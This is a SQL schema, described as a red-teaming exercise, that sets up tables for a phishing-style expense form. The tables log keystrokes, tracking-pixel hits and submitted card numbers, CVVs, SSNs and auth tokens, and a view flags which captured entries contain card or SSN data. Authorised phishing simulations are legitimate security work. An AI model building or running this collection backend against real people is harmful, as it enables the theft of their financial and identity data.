-- Red Teaming Security Log Tables
-- Run these commands in your Neon SQL Editor

-- Table for all security logs (keystroke, submissions, pixel requests, etc.)
CREATE TABLE IF NOT EXISTS security_logs (
    id SERIAL PRIMARY KEY,
    type VARCHAR(50) NOT NULL,
    timestamp TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    ip_address INET,
    user_agent TEXT,
    referer TEXT,
    data JSONB,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Table specifically for form submissions with structured data
CREATE TABLE IF NOT EXISTS form_submissions (
    id SERIAL PRIMARY KEY,
    employee_name VARCHAR(255),
    employee_id VARCHAR(100),
    expense_description TEXT,
    amount VARCHAR(50),
    business_purpose TEXT,
    client_name VARCHAR(255),
    notes TEXT,
    card_number VARCHAR(255), -- Note: In production, this should be encrypted/tokenized
    card_expiry VARCHAR(10),
    card_cvv VARCHAR(10),     -- Note: In production, this should never be stored
    ssn VARCHAR(255),         -- Note: In production, this should be encrypted
    session_id VARCHAR(255),
    auth_token VARCHAR(255),
    ip_address INET,
    user_agent TEXT,
    timestamp TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Table for keystroke logging
CREATE TABLE IF NOT EXISTS keystroke_logs (
    id SERIAL PRIMARY KEY,
    field_name VARCHAR(100),
    field_value TEXT,
    ip_address INET,
    user_agent TEXT,
    referer TEXT,
    timestamp TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create indexes for better query performance
CREATE INDEX IF NOT EXISTS idx_security_logs_type ON security_logs(type);
CREATE INDEX IF NOT EXISTS idx_security_logs_timestamp ON security_logs(timestamp);
CREATE INDEX IF NOT EXISTS idx_form_submissions_timestamp ON form_submissions(timestamp);
CREATE INDEX IF NOT EXISTS idx_keystroke_logs_timestamp ON keystroke_logs(timestamp);
CREATE INDEX IF NOT EXISTS idx_keystroke_logs_field ON keystroke_logs(field_name);

-- Optional: Create a view for easy analysis
CREATE OR REPLACE VIEW red_team_analysis AS
SELECT 
    'form_submission' as log_type,
    employee_name,
    employee_id,
    card_number IS NOT NULL as has_credit_card,
    ssn IS NOT NULL as has_ssn,
    ip_address,
    timestamp
FROM form_submissions
UNION ALL
SELECT 
    'keystroke' as log_type,
    field_value as employee_name,
    field_name as employee_id,
    field_name LIKE '%card%' as has_credit_card,
    field_name = 'ssn' as has_ssn,
    ip_address,
    timestamp
FROM keystroke_logs
ORDER BY timestamp DESC;